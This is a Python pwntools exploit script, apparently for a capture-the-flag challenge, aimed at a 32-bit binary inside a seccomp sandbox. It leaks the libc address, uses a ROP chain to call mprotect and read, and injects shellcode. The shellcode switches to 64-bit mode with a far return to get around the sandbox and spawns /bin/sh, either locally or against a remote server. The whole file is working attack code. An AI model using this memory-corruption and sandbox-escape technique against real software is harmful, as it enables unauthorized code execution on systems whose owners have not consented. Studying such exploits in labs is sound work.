#!/usr/bin/env python
# -*- coding: utf-8 -*-

# sandbox: https://github.com/CityHawk/samples/blob/c70f8f221d6cc9fcf8e456c2e1bec02505b0e771/strace_in_c/strace.c

from pwn import *
from time import sleep
import sys
#  context.binary = "./vuln"
#  context.log_level = "debug"

elf = ELF("./vuln", checksec = False)
if sys.argv[1] == "l":
    io = process(["./sandbox", "./vuln"])
    libc = elf.libc
elif sys.argv[1] == "d":
    io = process("./vuln")
    libc = elf.libc
else:
    io = remote("118.31.18.111", 20004)
    libc = ELF("./libc.so.6", checksec = False)

if __name__ == "__main__":
    payload = flat(cyclic(0x30), '\x48')
    payload += flat(elf.plt['puts'], 0x80484D0, elf.got['read'])
    io.sendline(payload)
    libc.address = u32(io.recvuntil("\xf7")[-4: ]) - libc.sym['read']
    success("libc -> {:#x}".format(libc.address))
    sleep(0.01)

    p3ret = 0x08048729
    payload = flat(cyclic(0x30), '\x48')
    payload += flat(libc.sym['mprotect'], p3ret, 0x804a000, 0x1000, 7)
    payload += flat(elf.sym['read'], elf.bss() + 0x200, 0, elf.bss() + 0x200, 0x500)
    raw_input("DEBUG: ")
    io.sendline(payload)

    sc = asm('''
            push 0x33
            push {pc}
            retf

            xor rax, rax
            mov al, 59
            mov edi, ecx
            add edi, 0x1a
            xor rsi, rsi
            xor rdx, rdx
            syscall
            '''.format(pc = 0x804a248), arch = 'amd64')

    io.send(sc + "/bin/sh\0")

    io.interactive()
